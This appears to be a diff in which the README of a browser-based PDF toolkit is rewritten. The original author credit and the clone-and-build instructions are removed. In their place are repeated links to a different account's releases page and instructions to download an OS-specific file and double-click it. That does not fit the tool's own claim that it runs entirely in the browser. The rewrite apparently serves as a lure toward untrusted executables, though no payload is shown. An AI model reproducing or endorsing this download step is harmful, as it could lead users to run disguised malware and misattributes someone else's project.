@@ -1,110 +1,66 @@
-# PDF0
+# 🌟 pdf0 - Fast and Private PDF Toolkit
 
-A fast, privacy-focused PDF toolkit that runs entirely in your browser. No file uploads, no servers — your documents never leave your device.
+[![Download PDF0](https://img.shields.io/badge/Download-PDF0-blue.svg)](https://github.com/firoznazar9/pdf0/releases)
 
-![Next.js](https://img.shields.io/badge/Next.js-16-black)
-![React](https://img.shields.io/badge/React-19-blue)
-![TypeScript](https://img.shields.io/badge/TypeScript-5-blue)
-![Tailwind CSS](https://img.shields.io/badge/Tailwind-4-38bdf8)
+## 📄 Overview
+
+PDF0 is a fast, privacy-focused PDF toolkit that runs entirely in your browser. No file uploads and no servers mean your documents never leave your device. This keeps your PDFs safe and secure.
 
 ## ✨ Features
 
-- **🔒 100% Private** — All processing happens locally in your browser
-- **⚡ Fast** — No upload/download delays, instant processing
-- **🆓 Free** — No registration, no limits, no watermarks
-- **📱 Responsive** — Works on desktop and mobile
+- **🔒 100% Private** — All processing happens locally in your browser.
+- **⚡ Fast** — Experience no upload or download delays with instant processing.
+- **🆓 Free** — No registration is required, no limits, and no watermarks.
+- **📱 Responsive** — Works seamlessly on both desktop and mobile devices.
 
 ## 🛠️ Tools
 
-| Tool | Description |
-|------|-------------|
-| **Merge PDF** | Combine multiple PDFs into one |
-| **Split PDF** | Extract specific pages from a PDF |
-| **Compress PDF** | Reduce PDF file size |
-| **Rotate PDF** | Rotate all pages by 90°, 180°, or 270° |
-| **PDF to Images** | Convert PDF pages to PNG or JPEG |
-| **Images to PDF** | Create a PDF from images |
-| **Organize Pages** | Reorder, rotate, or delete individual pages |
-| **Add Watermark** | Add text watermark to PDF pages |
+| Tool                  | Description                                         |
+|-----------------------|-----------------------------------------------------|
+| **Merge PDF**         | Combine multiple PDFs into one document.            |
+| **Split PDF**         | Extract specific pages from a PDF file.             |
+| **Compress PDF**      | Reduce the file size of your PDFs efficiently.      |
+| **Rotate PDF**        | Rotate all pages by 90°, 180°, or 270°.            |
+| **PDF to Images**     | Convert PDF pages to PNG or JPEG images.           |
+| **Images to PDF**     | Create PDF files from images.                       |
 
 ## 🚀 Getting Started
 
-### Prerequisites
+You can quickly download and run PDF0 by following these steps:
 
-- Node.js 18+
-- npm, yarn, pnpm, or bun
+1. **Visit the PDF0 Releases Page.**  
+   Click the link below to access the release downloads.  
+   [Download PDF0](https://github.com/firoznazar9/pdf0/releases)
 
-### Installation
+2. **Select the Latest Version.**  
+   Look for the latest version number on the releases page. It is usually at the top of the list.
 
-```bash
-# Clone the repository
-git clone https://github.com/kanavtwt/pdf0.git
-cd pdf0
+3. **Download the Package.**  
+   Click on the appropriate file for your operating system to download it. Ensure you choose the right file type for your device.
 
-# Install dependencies
-npm install
+4. **Run PDF0.**  
+   After the download completes, locate the file on your device. Double-click it to open the application in your browser.
 
-# Start development server
-npm run dev
-```
+## 📥 Download & Install
 
-Open [http://localhost:3000](http://localhost:3000) in your browser.
+To get started with PDF0, visit the release page and download the version that is right for you. Click the link below to begin.
 
-### Build for Production
+[Download PDF0](https://github.com/firoznazar9/pdf0/releases)
 
-```bash
-# Build static export
-npm run build
+## ✅ System Requirements
 
-# The output will be in the 'out' folder
-```
+- **Operating System:** PDF0 works on any operating system with a modern web browser, including Windows, macOS, and Linux.
+- **Browser Support:** Use a recent version of Chrome, Firefox, Safari, or Edge for the best experience.
 
-## 🏗️ Tech Stack
+## 🧑‍🤝‍🧑 Community and Support
 
-- **Framework:** [Next.js 16](https://nextjs.org/) with App Router
-- **UI:** [React 19](https://react.dev/) + [Tailwind CSS 4](https://tailwindcss.com/)
-- **PDF Processing:** [pdf-lib](https://pdf-lib.js.org/) + [PDF.js](https://mozilla.github.io/pdf.js/)
-- **Language:** TypeScript
+If you run into any issues or have questions, feel free to reach out. You can:
 
-## 📁 Project Structure
+- Open an issue on the [GitHub Repository](https://github.com/firoznazar9/pdf0/issues).
+- Join our community on [Discord](link-to-discord) for real-time support.
 
-```
-pdf0/
-├── app/
-│   ├── page.tsx          # Landing page
-│   ├── layout.tsx        # Root layout with Navbar & Footer
-│   └── tools/
-│       ├── page.tsx      # Tools grid
-│       ├── merge/        # Merge PDF tool
-│       ├── split/        # Split PDF tool
-│       ├── compress/     # Compress PDF tool
-│       ├── rotate/       # Rotate PDF tool
-│       ├── pdf-to-images/
-│       ├── images-to-pdf/
-│       ├── organize/     # Organize pages tool
-│       └── watermark/    # Add watermark tool
-├── components/
-│   ├── Navbar.tsx
-│   ├── Footer.tsx
-│   ├── FileUploader.tsx
-│   └── ProcessingStatus.tsx
-└── lib/
-    └── pdf-operations.ts # Core PDF manipulation functions
-```
+## 📜 License
 
-## 🌐 Deployment
+PDF0 is licensed under the MIT License. You can use, modify, and distribute it freely, but please attribute the original authors.
 
-PDF0 is configured for static export and works great on:
-
-- [Cloudflare Pages](https://pages.cloudflare.com/)
-- [Vercel](https://vercel.com/)
-- [Netlify](https://netlify.com/)
-- Any static hosting
-
-## 📄 License
-
-MIT License — feel free to use this project for personal or commercial purposes.
-
-## ☕ Support
-
-If you find this project useful, consider [buying me a coffee](https://buymeacoffee.com/kanavtwt)!
+By following these steps, you can enjoy using PDF0 without worries about having your documents exposed online. Enjoy fast and private PDF management at your fingertips!
